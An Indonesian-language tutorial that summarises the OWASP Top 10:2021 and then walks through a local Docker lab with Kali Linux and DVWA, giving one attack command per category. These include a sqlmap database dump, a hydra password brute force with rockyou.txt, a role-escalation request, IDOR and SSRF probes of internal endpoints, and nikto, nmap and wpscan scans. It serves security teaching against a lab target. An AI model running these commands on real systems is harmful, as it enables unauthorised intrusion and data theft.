# 🛡️ OWASP Top 10: 2021

![mapping](https://owasp.org/www-project-top-ten/assets/images/mapping.png)

| Kode         | Nama                                           | Penjelasan                                                                                                                                                        |
| ------------ | ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **A01:2021** | **Broken Access Control**                      | Peringkat naik dari posisi ke-5. 94% aplikasi diuji memiliki celah kontrol akses. 34 CWE terkait Broken Access Control memiliki jumlah kemunculan terbanyak.      |
| **A02:2021** | **Cryptographic Failures**                     | Naik ke posisi #2. Sebelumnya dikenal sebagai Sensitive Data Exposure. Fokus pada kegagalan penggunaan kriptografi yang dapat menyebabkan bocornya data sensitif. |
| **A03:2021** | **Injection**                                  | Turun ke posisi ke-3. 94% aplikasi diuji terhadap injection. Cross-site Scripting (XSS) kini masuk dalam kategori ini.                                            |
| **A04:2021** | **Insecure Design**                            | Kategori baru 2021. Fokus pada kelemahan desain sistem. Perlu pendekatan awal seperti threat modeling dan prinsip desain aman.                                    |
| **A05:2021** | **Security Misconfiguration**                  | Naik dari posisi ke-6. 90% aplikasi mengalami kesalahan konfigurasi. XML External Entities (XXE) kini tergabung dalam kategori ini.                               |
| **A06:2021** | **Vulnerable and Outdated Components**         | Sebelumnya "Using Components with Known Vulnerabilities". Tidak memiliki CVE, namun tetap menjadi ancaman besar.                                                  |
| **A07:2021** | **Identification and Authentication Failures** | Turun dari posisi ke-2. Fokus pada kegagalan identifikasi dan autentikasi. Standarisasi framework membantu menurunkan posisi ini.                                 |
| **A08:2021** | **Software and Data Integrity Failures**       | Kategori baru. Fokus pada integritas software, update, dan CI/CD pipeline. Insecure Deserialization dari 2017 kini termasuk di sini.                              |
| **A09:2021** | **Security Logging and Monitoring Failures**   | Dulu dikenal sebagai "Insufficient Logging & Monitoring". Kini diperluas, meski sulit diuji dan kurang terwakili dalam data CVE/CVSS.                             |
| **A10:2021** | **Server-Side Request Forgery (SSRF)**         | Kategori baru dari hasil survei komunitas (#1). Meskipun jarang ditemukan, memiliki potensi eksploitasi dan dampak yang besar.                                    |

---

Berikut adalah **Hands-on OWASP Top 10:2021 Exploitation Lab** lengkap menggunakan **Kali Linux dalam Docker**, **beserta tools dan target testing** yang bisa kamu jalankan di lokal.

---

## 🧪 Hands-on OWASP Top 10:2021 Exploitation Lab

### 🔧 Setup Awal

#### 1. **Pull & Jalankan Kali Linux**

```bash
docker pull kalilinux/kali-rolling
docker run -it --network host kalilinux/kali-rolling /bin/bash
```

> `--network host` memudahkan akses ke aplikasi lokal dari Kali.

#### 2. **Install Tools Pentest di Kali**

```bash
apt update && apt install -y \
  sqlmap nmap nikto hydra wfuzz john \
  gobuster wpscan curl git \
  python3-pip php composer wget unzip \
  burpsuite zaproxy chromium
```

---

## 🧪 Hands-on Berdasarkan OWASP Top 10

---

### 🛑 A01:2021 - Broken Access Control

#### 🔧 Simulasi: Akses ID user lain tanpa izin

```bash
curl -b 'session=admin' http://target.local/profile?id=2
```

#### ✅ Cek:

* Bisa akses data user lain tanpa autentikasi.
* Respon HTTP 200 + data user lain → Broken Access Control.

---

### 🔐 A02:2021 - Cryptographic Failures

#### 🔧 Cek situs pakai HTTPS (atau tidak)

```bash
curl -I http://target.local/login
```

#### ✅ Cek:

* Tidak ada `Strict-Transport-Security`.
* Password dikirim plaintext (bisa dicek via Wireshark/tcpdump).

---

### 💉 A03:2021 - Injection (SQLi)

#### 🔧 Gunakan `sqlmap`

```bash
sqlmap -u "http://target.local/vulnerable.php?id=1" --dbs
```

#### ✅ Cek:

* Sqlmap mengekstrak database → Rentan SQL Injection.

---

### 🧠 A04:2021 - Insecure Design

#### 🔧 Analisis Flow Aplikasi

Misalnya: bisa daftar sebagai admin via URL:

```bash
curl http://target.local/register?role=admin
```

#### ✅ Cek:

* Tidak ada validasi di sisi backend.
* Desain sistem memperbolehkan eskalasi role → insecure design.

---

### ⚙️ A05:2021 - Security Misconfiguration

#### 🔧 Scan pakai `nikto`

```bash
nikto -h http://target.local
```

#### ✅ Cek:

* Directory listing enabled
* Default credentials aktif
* Header keamanan tidak disetel

---

### 🧱 A06:2021 - Vulnerable and Outdated Components

#### 🔧 Scan pakai `wpscan` atau `nmap + vulners`

```bash
nmap -sV --script vulners -p80 target.local
```

Atau:

```bash
wpscan --url http://target.local --enumerate vp
```

#### ✅ Cek:

* Plugin/CMS/libraries jadul ditemukan → potensi eksploitasi.

---

### 👤 A07:2021 - Identification and Authentication Failures

#### 🔧 Brute Force pakai `hydra`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.local http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect"
```

#### ✅ Cek:

* Login berhasil tanpa CAPTCHA, delay, atau rate-limit.

---

### 🔒 A08:2021 - Software and Data Integrity Failures

#### 🔧 Cek Update Tidak Aman

Misalnya: `update.php` mengunduh script tanpa verifikasi:

```bash
curl http://target.local/update.php
```

#### ✅ Cek:

* File update tidak memiliki hash/checksum.
* Bisa disisipi malware (backdoor).

---

### 📜 A09:2021 - Security Logging and Monitoring Failures

#### 🔧 Cek Log Webserver

Masuk ke target server:

```bash
cat /var/log/apache2/access.log
```

#### ✅ Cek:

* Tidak ada log untuk request 401, 403, atau 500.
* Tidak ada notifikasi alert (IDS/IPS tidak aktif).

---

### 🌐 A10:2021 - Server-Side Request Forgery (SSRF)

#### 🔧 Cek URL Fetcher di aplikasi

Misalnya aplikasi fetch URL input dari user:

```bash
curl http://target.local/fetch?url=http://127.0.0.1/admin
```

#### ✅ Cek:

* Bisa akses internal endpoint (`localhost`, `metadata.google.internal`, dll).
* Data sensitif bisa diambil lewat SSRF.

---

## 🧪 Optional: Jalankan Target DVWA (Damn Vulnerable Web App)

### Buat file `docker-compose.yml`

```yaml
version: '3'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    restart: always
```

### Jalankan

```bash
docker-compose up -d
```

Akses di browser: [http://localhost:8080](http://localhost:8080)
